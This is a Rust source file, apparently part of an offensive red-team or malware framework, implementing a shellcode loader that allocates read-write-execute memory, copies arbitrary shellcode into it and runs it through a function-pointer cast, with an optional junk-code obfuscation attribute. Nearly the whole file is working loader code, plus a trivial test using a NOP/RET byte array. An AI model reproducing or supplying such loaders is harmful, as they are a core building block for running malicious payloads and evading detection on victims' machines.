//! Loader Template 7 - Function pointer self-injection
//!
//! Simple shellcode execution via function pointer cast.
//! Allocates RWX memory, copies shellcode, and executes via function pointer.

use crate::loaders::common::{Shellcode, alloc_exec_memory};
use std::ptr;

/// Execute shellcode via function pointer invocation
///
/// # Safety
/// This function executes arbitrary code and is inherently unsafe.
#[cfg_attr(feature = "obf_junk", malefic_gateway::junk)]
pub unsafe fn execute(shellcode: &Shellcode) -> Result<(), String> {
    debug_println!("[*] Starting loader_7: Function pointer self-injection");

    let size = shellcode.len();

    // Allocate executable memory
    let addr = alloc_exec_memory(size)
        .ok_or_else(|| format!("Failed to allocate memory"))?;

    debug_println!("[+] Allocated {} bytes at {:p}", size, addr);

    // Copy shellcode to allocated memory
    ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        addr as *mut u8,
        size,
    );

    debug_println!("[+] Shellcode copied to memory");

    // Execute via function pointer
    let func: unsafe extern "system" fn() = std::mem::transmute(addr);
    debug_println!("[*] Executing shellcode...");
    func();

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shellcode_struct() {
        let data = vec![0x90, 0x90, 0xC3]; // NOP NOP RET
        let sc = Shellcode::new(data);
        assert_eq!(sc.len(), 3);
    }
}
